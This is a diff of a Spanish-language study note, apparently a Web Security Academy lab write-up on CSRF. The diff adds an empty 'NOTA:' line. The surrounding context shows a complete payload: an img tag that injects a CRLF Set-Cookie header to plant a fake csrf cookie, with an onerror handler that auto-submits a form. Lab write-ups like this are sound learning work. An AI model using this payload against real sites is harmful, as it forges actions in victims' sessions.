@@ -58,6 +58,7 @@ donde
 ```python
 <img src="https://0aac003e046af89e81ef842e00ce003f.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
 ```
-
 seria nuestra inyección completa y maliciosa
+
+`NOTA: ` 
 ![[Pasted image 20250710165217.png]]
